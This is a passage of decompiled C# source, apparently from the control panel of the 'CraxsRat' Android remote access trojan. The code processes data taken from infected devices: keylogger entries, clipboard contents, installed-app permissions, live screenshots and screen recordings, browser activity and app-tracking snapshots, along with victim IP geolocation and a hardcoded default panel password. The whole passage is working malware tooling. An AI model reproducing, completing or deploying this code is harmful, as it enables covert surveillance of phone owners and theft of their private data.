																	_0024VB_0024ResumableLocal_keylogg_0024502.DGV0.Rows[_0024VB_0024ResumableLocal_keylogg_0024502.DGV0.RowCount - 1].Selected = true;
																}
															}
															catch (Exception ex161)
															{
																ProjectData.SetProjectError(ex161);
																Exception ex162 = ex161;
																_0024VB_0024ResumableLocal_ex_0024519 = ex162;
																ProjectData.ClearProjectError();
															}
														}
													}
												}
											}
											catch (Exception ex163)
											{
												ProjectData.SetProjectError(ex163);
												Exception ex164 = ex163;
												_0024VB_0024ResumableLocal_ex_0024520 = ex164;
												ProjectData.ClearProjectError();
											}
										}
										else if (Operators.CompareString(_0024S186, SecurityKey.AppsProperties, TextCompare: false) == 0)
										{
											try
											{
												_0024VB_0024ResumableLocal_SPL_0024521 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1)).Split(new string[1] { SPL_DATA }, StringSplitOptions.None);
												_0024VB_0024ResumableLocal_SPL_lines_0024522 = _0024VB_0024ResumableLocal_SPL_0024521[1].Split(new string[1] { SPL_LINE }, StringSplitOptions.RemoveEmptyEntries);
												_0024VB_0024ResumableLocal_SPLArry_0024523 = _0024VB_0024ResumableLocal_SPL_lines_0024522[0].Split(new string[1] { SPL_ARRAY }, StringSplitOptions.RemoveEmptyEntries);
												_0024VB_0024ResumableLocal_handle_0024524 = "Properties_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress + "_" + _0024VB_0024ResumableLocal_SPLArry_0024523[1];
												_0024VB_0024ResumableLocal_AppsProperties_0024525 = (AppsProperties)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024524];
												if (_0024VB_0024ResumableLocal_AppsProperties_0024525 == null)
												{
													_0024VB_0024ResumableLocal_AppsProperties_0024525 = new AppsProperties();
													_0024VB_0024ResumableLocal_AppsProperties_0024525.Name = _0024VB_0024ResumableLocal_handle_0024524;
													_0024VB_0024ResumableLocal_AppsProperties_0024525.Title = string.Format("{0} - IP:{1}", "Properties", _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP);
													_0024VB_0024ResumableLocal_AppsProperties_0024525.Show();
													_0024VB_0024ResumableLocal_AppsProperties_0024525.LAppName.Text = _0024VB_0024ResumableLocal_SPLArry_0024523[0];
													_0024VB_0024ResumableLocal_AppsProperties_0024525.BoxIcons.Tag = _0024VB_0024ResumableLocal_SPLArry_0024523[1];
													_0024VB_0024ResumableLocal_image_0024526 = Image.FromStream(new MemoryStream(Convert.FromBase64String(_0024VB_0024ResumableLocal_SPLArry_0024523[2])));
													_0024VB_0024ResumableLocal_AppsProperties_0024525.BoxIcons.Image = _0024VB_0024ResumableLocal_image_0024526;
													_0024VB_0024ResumableLocal_AppsProperties_0024525.LAppFlag.Text = _0024VB_0024ResumableLocal_SPLArry_0024523[3];
													_0024VB_0024ResumableLocal_AppsProperties_0024525.LAppInstallTime.Text = _0024VB_0024ResumableLocal_SPLArry_0024523[4];
													_0024VB_0024ResumableLocal_SPLArry_0024523 = _0024VB_0024ResumableLocal_SPL_lines_0024522[1].Split(new string[1] { SPL_ARRAY }, StringSplitOptions.RemoveEmptyEntries);
													_0024VB_0024ResumableLocal_c0_0024527 = _0024VB_0024ResumableLocal_AppsProperties_0024525.BOXPNL1.Controls[0];
													_0024VB_0024ResumableLocal_c1_0024528 = _0024VB_0024ResumableLocal_AppsProperties_0024525.BOXPNL1.Controls[1];
													_0024VB_0024ResumableLocal_c2_0024529 = _0024VB_0024ResumableLocal_AppsProperties_0024525.BOXPNL1.Controls[2];
													_0024VB_0024ResumableLocal_c3_0024530 = _0024VB_0024ResumableLocal_AppsProperties_0024525.BOXPNL1.Controls[3];
													_0024VB_0024ResumableLocal_c4_0024531 = _0024VB_0024ResumableLocal_AppsProperties_0024525.BOXPNL1.Controls[4];
													_0024VB_0024ResumableLocal_AppsProperties_0024525.BOXPNL1.Controls.Clear();
													_0024S532 = _0024VB_0024ResumableLocal_SPLArry_0024523;
													for (_0024S533 = 0; _0024S533 < _0024S532.Length; _0024S533++)
													{
														_0024VB_0024ResumableLocal_Permissions_0024534 = _0024S532[_0024S533];
														_0024VB_0024ResumableLocal_lab_0024535 = new Label();
														_0024VB_0024ResumableLocal_lab_0024535.Dock = DockStyle.Top;
														_0024VB_0024ResumableLocal_lab_0024535.Text = _0024VB_0024ResumableLocal_Permissions_0024534;
														_0024VB_0024ResumableLocal_lab_0024535.TextAlign = ContentAlignment.MiddleCenter;
														_0024VB_0024ResumableLocal_lab_0024535.ForeColor = SpySettings.DefaultColor_Foreground;
														_0024VB_0024ResumableLocal_lab_0024535.BackColor = SpySettings.DefaultColor_Background;
														_0024VB_0024ResumableLocal_AppsProperties_0024525.BOXPNL1.Controls.Add(_0024VB_0024ResumableLocal_lab_0024535);
														Application.DoEvents();
													}
													_0024VB_0024ResumableLocal_AppsProperties_0024525.BOXPNL1.Controls.Add(_0024VB_0024ResumableLocal_c0_0024527);
													_0024VB_0024ResumableLocal_AppsProperties_0024525.BOXPNL1.Controls.Add(_0024VB_0024ResumableLocal_c1_0024528);
													_0024VB_0024ResumableLocal_AppsProperties_0024525.BOXPNL1.Controls.Add(_0024VB_0024ResumableLocal_c2_0024529);
													_0024VB_0024ResumableLocal_AppsProperties_0024525.BOXPNL1.Controls.Add(_0024VB_0024ResumableLocal_c3_0024530);
													_0024VB_0024ResumableLocal_AppsProperties_0024525.BOXPNL1.Controls.Add(_0024VB_0024ResumableLocal_c4_0024531);
												}
											}
											catch (Exception ex165)
											{
												ProjectData.SetProjectError(ex165);
												Exception ex166 = ex165;
												_0024VB_0024ResumableLocal_ex_0024536 = ex166;
												ProjectData.ClearProjectError();
											}
										}
										else if (Operators.CompareString(_0024S186, SecurityKey.getClipboard, TextCompare: false) == 0)
										{
											try
											{
												_0024VB_0024ResumableLocal_SPL_0024537 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1)).Split(new string[1] { SPL_DATA }, StringSplitOptions.None);
												_0024VB_0024ResumableLocal_handle_0024538 = "Clipboard_Manager_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress;
												_0024VB_0024ResumableLocal_ClipboardManager_0024539 = (ClipboardManager)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024538];
												if (_0024VB_0024ResumableLocal_ClipboardManager_0024539 == null)
												{
													_0024VB_0024ResumableLocal_ClipboardManager_0024539 = new ClipboardManager();
													_0024VB_0024ResumableLocal_ClipboardManager_0024539.Name = _0024VB_0024ResumableLocal_handle_0024538;
													_0024VB_0024ResumableLocal_ClipboardManager_0024539.Title = string.Format("{0} - IP:{1}", "Clipboard", _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP);
													_0024VB_0024ResumableLocal_ClipboardManager_0024539.Client = _0024VB_0024ResumableLocal_Client_00243;
													_0024VB_0024ResumableLocal_ClipboardManager_0024539.classClient = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient;
													_0024VB_0024ResumableLocal_ClipboardManager_0024539.Show();
												}
												_0024VB_0024ResumableLocal_ClipboardManager_0024539.BoxClipboard.Text = _0024VB_0024ResumableLocal_SPL_0024537[1];
											}
											catch (Exception ex167)
											{
												ProjectData.SetProjectError(ex167);
												Exception ex168 = ex167;
												_0024VB_0024ResumableLocal_ex_0024540 = ex168;
												ProjectData.ClearProjectError();
											}
										}
										else if (Operators.CompareString(_0024S186, SecurityKey.acquire, TextCompare: false) == 0)
										{
											_0024VB_0024ResumableLocal_SPL_0024541 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(0)).Split(new string[1] { SPL_ARRAY }, StringSplitOptions.None);
											_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.power = Operators.CompareString(_0024VB_0024ResumableLocal_SPL_0024541[1], "power", TextCompare: false) == 0;
											_0024VB_0024ResumableLocal_obj_Upd_0024542 = new object[4]
											{
												_0024VB_0024ResumableLocal_Client_00243,
												SecurityKey.KeysClient1 + SPL_SOCKET + reso.domen + ".info" + SPL_SOCKET + "method" + SPL_SOCKET + SecurityKey.getUpdate + SPL_SOCKET + "update",
												Codes.Encoding().GetBytes("null"),
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient
											};
											_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.SendMessage(_0024VB_0024ResumableLocal_obj_Upd_0024542);
										}
										else
										{
											try
											{
												if (_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient != null)
													_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.isconnected = false;
											}
											catch (Exception ex169)
											{
												ProjectData.SetProjectError(ex169);
												Exception ex170 = ex169;
												_0024VB_0024ResumableLocal_skip_0024543 = ex170;
												ProjectData.ClearProjectError();
											}
										}
									}
								}
							}
						}
						end_IL_0008:;
					}
					catch (Exception ex171)
					{
						ProjectData.SetProjectError(ex171);
						Exception ex172 = ex171;
						_0024VB_0024ResumableLocal_ex_0024544 = ex172;
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception ex173)
				{
					ProjectData.SetProjectError(ex173);
					Exception exception = ex173;
					_0024State = -2;
					_0024Builder.SetException(exception);
					ProjectData.ClearProjectError();
					return;
				}
				num = -2;
				_0024State = -2;
				_0024Builder.SetResult();
			}
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerNonUserCode]
		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D0
	{
		public string[] _0024VB_0024Local_SPL;

		public _Closure_0024__39_002D1 _0024VB_0024NonLocal__0024VB_0024Closure_2;

		public _Closure_0024__39_002D0(_Closure_0024__39_002D0 arg0)
		{
			if (arg0 != null)
				_0024VB_0024Local_SPL = arg0._0024VB_0024Local_SPL;
		}

		[SpecialName]
		internal void _Lambda_0024__1()
		{
			try
			{
				if (Operators.CompareString(_0024VB_0024Local_SPL[8].ToString(), "-1", TextCompare: false) != 0)
					_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Wallpaper = reso.Wallpaper(_0024VB_0024Local_SPL[8], 48, 48, _0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Wallpaper = (Bitmap)Codes.BlankImage();
				ProjectData.ClearProjectError();
			}
			try
			{
				_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.WallpaperBackup = (Bitmap)Codes.BlankImage();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.WallpaperBackup = (Bitmap)Codes.BlankImage();
				ProjectData.ClearProjectError();
			}
		}

		[SpecialName]
		internal void _Lambda_0024__2()
		{
			if ((object)_0024VB_0024Local_SPL[11] != "-1")
			{
				string left = _0024VB_0024Local_SPL[11];
				if (Operators.CompareString(left, "1", TextCompare: false) != 0)
				{
					if (Operators.CompareString(left, "0", TextCompare: false) != 0)
						_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Wifi = Resources.wifi;
					else
						_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Wifi = Resources._3g;
				}
				else
					_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Wifi = Resources.wifi;
			}
			else
				_0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_ClassClient.Wifi = Resources.wifi;
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D1
	{
		public Client _0024VB_0024Local_ClassClient;

		public _Closure_0024__39_002D1(_Closure_0024__39_002D1 arg0)
		{
			if (arg0 != null)
				_0024VB_0024Local_ClassClient = arg0._0024VB_0024Local_ClassClient;
		}

		[SpecialName]
		internal void _Lambda_0024__10()
		{
			if (_0024VB_0024Local_ClassClient.FirewallTable.Rows.Count > 0)
				_0024VB_0024Local_ClassClient.FirewallTable.Rows.Clear();
		}

		[SpecialName]
		internal void _Lambda_0024__13()
		{
			if (_0024VB_0024Local_ClassClient.TrackedAppsTable.Rows.Count > 0)
				_0024VB_0024Local_ClassClient.TrackedAppsTable.Rows.Clear();
			if (MainForm.combodatestrack.Items != null && MainForm.combodatestrack.Items.Count > 0)
			{
				MainForm.combodatestrack.Items.Clear();
				MainForm.combodatestrack.Text = "";
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D10
	{
		public string[] _0024VB_0024Local_collect;

		public string _0024VB_0024Local_Appname;

		public string[] _0024VB_0024Local_datesandinfo;

		public _Closure_0024__39_002D11 _0024VB_0024NonLocal__0024VB_0024Closure_10;

		public _Closure_0024__39_002D10(_Closure_0024__39_002D10 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_collect = arg0._0024VB_0024Local_collect;
				_0024VB_0024Local_Appname = arg0._0024VB_0024Local_Appname;
				_0024VB_0024Local_datesandinfo = arg0._0024VB_0024Local_datesandinfo;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__14()
		{
			if (_0024VB_0024Local_collect[0].Equals("O"))
				_0024VB_0024NonLocal__0024VB_0024Closure_10._0024VB_0024NonLocal__0024VB_0024Closure_9._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.TrackedAppsTable.Rows.Add(Codes.ResizeImage(Resources.ok, new Size(32, 32)), _0024VB_0024Local_Appname, _0024VB_0024NonLocal__0024VB_0024Closure_10._0024VB_0024Local_HasRecords, _0024VB_0024Local_collect[2], Codes.ProcessJson(_0024VB_0024Local_datesandinfo[0]));
			else if (_0024VB_0024Local_collect[0].Equals("N"))
			{
				_0024VB_0024NonLocal__0024VB_0024Closure_10._0024VB_0024NonLocal__0024VB_0024Closure_9._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.TrackedAppsTable.Rows.Add(Codes.ResizeImage(Resources.notok, new Size(32, 32)), _0024VB_0024Local_Appname, _0024VB_0024NonLocal__0024VB_0024Closure_10._0024VB_0024Local_HasRecords, _0024VB_0024Local_collect[2], "");
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D11
	{
		public string _0024VB_0024Local_HasRecords;

		public _Closure_0024__39_002D13 _0024VB_0024NonLocal__0024VB_0024Closure_9;

		public _Closure_0024__39_002D11(_Closure_0024__39_002D11 arg0)
		{
			if (arg0 != null)
				_0024VB_0024Local_HasRecords = arg0._0024VB_0024Local_HasRecords;
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D12
	{
		public snapsdownloader _0024VB_0024Local_DownSnap;

		public string _0024VB_0024Local_handle;

		public _Closure_0024__39_002D13 _0024VB_0024NonLocal__0024VB_0024Closure_11;

		public _Closure_0024__39_002D12(_Closure_0024__39_002D12 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_DownSnap = arg0._0024VB_0024Local_DownSnap;
				_0024VB_0024Local_handle = arg0._0024VB_0024Local_handle;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__15()
		{
			_0024VB_0024Local_DownSnap = new snapsdownloader();
			_0024VB_0024Local_DownSnap.Name = _0024VB_0024Local_handle;
			_0024VB_0024Local_DownSnap.infotext.Text = "Name: " + _0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.ClientName + Strings.Space(4) + "IP: " + _0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.ClientAddressIP;
			_0024VB_0024Local_DownSnap.clipic.Image = _0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.Wallpaper;
			_0024VB_0024Local_DownSnap.totaltext.Text = "-> Total : " + _0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024Local_arry2[1].Replace("F:", "");
			_0024VB_0024Local_DownSnap.statustext.Text = "-> Status : Starting";
			_0024VB_0024Local_DownSnap.finishedtext.Text = "-> Finished: 0";
			_0024VB_0024Local_DownSnap.lefttext.Text = "-> Left: " + _0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024Local_arry2[1].Replace("F:", "");
			_0024VB_0024Local_DownSnap.totalImages = int.Parse(_0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024Local_arry2[1].Replace("F:", ""));
			_0024VB_0024Local_DownSnap.Downloadfolder = _0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.FolderUSER + "\\Tracker_Snaps";
			if (!Directory.Exists(_0024VB_0024Local_DownSnap.Downloadfolder))
				Directory.CreateDirectory(_0024VB_0024Local_DownSnap.Downloadfolder);
			_0024VB_0024Local_DownSnap.Show();
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D13
	{
		public string[] _0024VB_0024Local_arry2;

		public _Closure_0024__39_002D1 _0024VB_0024NonLocal__0024VB_0024Closure_8;

		public _Closure_0024__39_002D13(_Closure_0024__39_002D13 arg0)
		{
			if (arg0 != null)
				_0024VB_0024Local_arry2 = arg0._0024VB_0024Local_arry2;
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D14
	{
		public string _0024VB_0024Local_appname;

		public _Closure_0024__39_002D14(_Closure_0024__39_002D14 arg0)
		{
			if (arg0 != null)
				_0024VB_0024Local_appname = arg0._0024VB_0024Local_appname;
		}

		[SpecialName]
		internal void _Lambda_0024__16()
		{
			CraxsAlert.ShowSucess(_0024VB_0024Local_appname + " record has been Removed");
		}

		[SpecialName]
		internal void _Lambda_0024__17()
		{
			CraxsAlert.ShowSucess(_0024VB_0024Local_appname + " error while removing...");
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D15
	{
		public WebViewMonitor _0024VB_0024Local_BrowserMonitor;

		public _Closure_0024__39_002D15(_Closure_0024__39_002D15 arg0)
		{
			if (arg0 != null)
				_0024VB_0024Local_BrowserMonitor = arg0._0024VB_0024Local_BrowserMonitor;
		}

		[SpecialName]
		internal void _Lambda_0024__18()
		{
			_0024VB_0024Local_BrowserMonitor.datalogtext.Text = "";
		}

		[SpecialName]
		internal void _Lambda_0024__19()
		{
			_0024VB_0024Local_BrowserMonitor.linkspanel.Controls.Clear();
		}

		[SpecialName]
		internal void _Lambda_0024__20()
		{
			_0024VB_0024Local_BrowserMonitor.MapData.Clear();
			_0024VB_0024Local_BrowserMonitor.namescombo.Items.Clear();
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D16
	{
		public string _0024VB_0024Local_name;

		public string _0024VB_0024Local_lnk;

		public string _0024VB_0024Local_id;

		public _Closure_0024__39_002D15 _0024VB_0024NonLocal__0024VB_0024Closure_12;

		public _Closure_0024__39_002D16(_Closure_0024__39_002D16 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_name = arg0._0024VB_0024Local_name;
				_0024VB_0024Local_lnk = arg0._0024VB_0024Local_lnk;
				_0024VB_0024Local_id = arg0._0024VB_0024Local_id;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__21()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_12._0024VB_0024Local_BrowserMonitor.namescombo.Items.Add(_0024VB_0024Local_name);
			if (!_0024VB_0024NonLocal__0024VB_0024Closure_12._0024VB_0024Local_BrowserMonitor.MapData.ContainsKey(_0024VB_0024Local_name))
				_0024VB_0024NonLocal__0024VB_0024Closure_12._0024VB_0024Local_BrowserMonitor.MapData.Add(_0024VB_0024Local_name, _0024VB_0024Local_lnk + ":" + _0024VB_0024Local_id);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D17
	{
		public string _0024VB_0024Local_name;

		public string _0024VB_0024Local_lnk;

		public string _0024VB_0024Local_id;

		public _Closure_0024__39_002D15 _0024VB_0024NonLocal__0024VB_0024Closure_13;

		public _Closure_0024__39_002D17(_Closure_0024__39_002D17 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_name = arg0._0024VB_0024Local_name;
				_0024VB_0024Local_lnk = arg0._0024VB_0024Local_lnk;
				_0024VB_0024Local_id = arg0._0024VB_0024Local_id;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__22()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_13._0024VB_0024Local_BrowserMonitor.namescombo.Items.Add(_0024VB_0024Local_name);
			if (!_0024VB_0024NonLocal__0024VB_0024Closure_13._0024VB_0024Local_BrowserMonitor.MapData.ContainsKey(_0024VB_0024Local_name))
				_0024VB_0024NonLocal__0024VB_0024Closure_13._0024VB_0024Local_BrowserMonitor.MapData.Add(_0024VB_0024Local_name, _0024VB_0024Local_lnk + ":" + _0024VB_0024Local_id);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D2
	{
		public ScreenShoter _0024VB_0024Local_Screener;

		public _Closure_0024__39_002D2(_Closure_0024__39_002D2 arg0)
		{
			if (arg0 != null)
				_0024VB_0024Local_Screener = arg0._0024VB_0024Local_Screener;
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D3
	{
		public Bitmap _0024VB_0024Local_bmp;

		public _Closure_0024__39_002D2 _0024VB_0024NonLocal__0024VB_0024Closure_3;

		public _Closure_0024__39_002D3(_Closure_0024__39_002D3 arg0)
		{
			if (arg0 != null)
				_0024VB_0024Local_bmp = arg0._0024VB_0024Local_bmp;
		}

		[SpecialName]
		internal void _Lambda_0024__4()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_Screener.Livepicbox.Image = _0024VB_0024Local_bmp;
		}

		[SpecialName]
		internal void _Lambda_0024__5()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_3._0024VB_0024Local_Screener.Livepicbox.Image = _0024VB_0024Local_bmp;
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D4
	{
		public ScreenReaderV2 _0024VB_0024Local_ScRecorder;

		public _Closure_0024__39_002D4(_Closure_0024__39_002D4 arg0)
		{
			if (arg0 != null)
				_0024VB_0024Local_ScRecorder = arg0._0024VB_0024Local_ScRecorder;
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D5
	{
		public string[] _0024VB_0024Local_theData;

		public _Closure_0024__39_002D4 _0024VB_0024NonLocal__0024VB_0024Closure_4;

		public _Closure_0024__39_002D5(_Closure_0024__39_002D5 arg0)
		{
			if (arg0 != null)
				_0024VB_0024Local_theData = arg0._0024VB_0024Local_theData;
		}

		[SpecialName]
		internal void _Lambda_0024__6()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_4._0024VB_0024Local_ScRecorder.activetext.Text = _0024VB_0024Local_theData[3];
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D6
	{
		public Bitmap _0024VB_0024Local_bmp;

		public _Closure_0024__39_002D5 _0024VB_0024NonLocal__0024VB_0024Closure_5;

		public _Closure_0024__39_002D6(_Closure_0024__39_002D6 arg0)
		{
			if (arg0 != null)
				_0024VB_0024Local_bmp = arg0._0024VB_0024Local_bmp;
		}

		[SpecialName]
		internal void _Lambda_0024__7()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_5._0024VB_0024NonLocal__0024VB_0024Closure_4._0024VB_0024Local_ScRecorder.viewpic.Image = _0024VB_0024Local_bmp;
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D7
	{
		public string[] _0024VB_0024Local_SPL;

		public _Closure_0024__39_002D1 _0024VB_0024NonLocal__0024VB_0024Closure_6;

		public _Closure_0024__39_002D7(_Closure_0024__39_002D7 arg0)
		{
			if (arg0 != null)
				_0024VB_0024Local_SPL = arg0._0024VB_0024Local_SPL;
		}

		[SpecialName]
		internal void _Lambda_0024__8()
		{
			_0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.Wallpaper = reso.Wallpaper(_0024VB_0024Local_SPL[1], 48, 48, _0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient);
		}

		[SpecialName]
		internal void _Lambda_0024__9()
		{
			try
			{
				if ((object)_0024VB_0024Local_SPL[4] != "-1")
				{
					string left = _0024VB_0024Local_SPL[4];
					if (Operators.CompareString(left, "1", TextCompare: false) != 0)
					{
						if (Operators.CompareString(left, "0", TextCompare: false) != 0)
							_0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.Wifi = Resources.wifi;
						else
							_0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.Wifi = Resources._3g;
					}
					else
						_0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.Wifi = Resources.wifi;
				}
				else
					_0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.Wifi = Resources.wifi;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				_0024VB_0024NonLocal__0024VB_0024Closure_6._0024VB_0024Local_ClassClient.WallpaperBackup = (Bitmap)Codes.BlankImage();
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D8
	{
		public string[] _0024VB_0024Local_appinfo;

		public _Closure_0024__39_002D1 _0024VB_0024NonLocal__0024VB_0024Closure_7;

		public _Closure_0024__39_002D8(_Closure_0024__39_002D8 arg0)
		{
			if (arg0 != null)
				_0024VB_0024Local_appinfo = arg0._0024VB_0024Local_appinfo;
		}

		[SpecialName]
		internal void _Lambda_0024__11()
		{
			if (Operators.CompareString(_0024VB_0024Local_appinfo[0], "B", TextCompare: false) != 0)
				_0024VB_0024NonLocal__0024VB_0024Closure_7._0024VB_0024Local_ClassClient.FirewallTable.Rows.Add(Codes.Base64ToImage(_0024VB_0024Local_appinfo[3]), _0024VB_0024Local_appinfo[2], "Allowed", _0024VB_0024Local_appinfo[1]);
			else
				_0024VB_0024NonLocal__0024VB_0024Closure_7._0024VB_0024Local_ClassClient.FirewallTable.Rows.Add(Codes.Base64ToImage(_0024VB_0024Local_appinfo[3]), _0024VB_0024Local_appinfo[2], "Blocked", _0024VB_0024Local_appinfo[1]);
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__39_002D9
	{
		public string[] _0024VB_0024Local_arrystr;

		public VB_0024AnonymousDelegate_0 _0024I12;

		public _Closure_0024__39_002D9(_Closure_0024__39_002D9 arg0)
		{
			if (arg0 != null)
				_0024VB_0024Local_arrystr = arg0._0024VB_0024Local_arrystr;
		}

		[SpecialName]
		internal void _Lambda_0024__12()
		{
			CraxsAlert.ShowSucess(_0024VB_0024Local_arrystr[1] + " has been: " + _0024VB_0024Local_arrystr[2]);
		}
	}

	public static string Sessionkey;

	public static string GlobalKey1;

	public static string GlobalKey2;

	public static string GlobalKey3;

	public static Dictionary<string, Client> _clientRowIndices;

	public static object SyncWorkerRemove;

	public static object Lockactive;

	public static bool Echoed;

	public static Collection SyncClientsOnline;

	public static object SyncRequestsReceiver;

	public static object SyncListWorker;

	public static object SyncWorkerRequests;

	public static object SyncDataHandel;

	public static object SyncNotifications;

	public static string SPL_SOCKET;

	public static string SPL_DATA;

	public static string SPL_LINE;

	public static string SPL_ARRAY;

	public static CraxsMain MainForm;

	public static Client LastClient;

	public static GeoIP GeoIP0;

	public static string password;

	public static ImageList imageFlags;

	public static string Thumbs;

	private static Collection imageListLarge;

	public static Collection ClientsOnline;

	public static string Filenamethum;

	public static InfoClass cityclass;

	public static bool Cameraison;

	public static Collection LockRemoveCard;

	public static string THEKEY;

	public static string JK;

	public static void CraxsRatkfvuiorkenfudpajrsnCraxsRatsuhsdkax()
	{
		string path = Environment.CurrentDirectory.ToString() + "\\res\\Config\\Pass.inf";
		imageListLarge = new Collection();
		LockRemoveCard = new Collection();
		ClientsOnline = new Collection();
		int try0034_dispatch = -1;
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0034_dispatch)
				{
				default:
				{
					if (!File.Exists(path))
						File.WriteAllText(path, Codes.Encrypt("X0X0X", THEKEY));
					string[] array = File.ReadAllLines(path);
					if (array.GetValue(0).ToString().Length < 3)
					{
						File.WriteAllText(path, Codes.Encrypt("X0X0X", THEKEY));
						password = Codes.AES_Decrypt(Codes.Encrypt("X0X0X", THEKEY), THEKEY);
					}
					else
						password = Codes.AES_Decrypt(array.GetValue(0).ToString(), THEKEY);
					break;
				}
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				File.WriteAllText(path, Codes.Encrypt("X0X0X", THEKEY));
				ProjectData.ClearProjectError();
				try0034_dispatch = 53;
				continue;
			}
			break;
		}
		SecurityKey.CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwejhga();
		GeoIP0 = new GeoIP(reso.res_Path + "\\GeoIP\\GeoIP.dat");
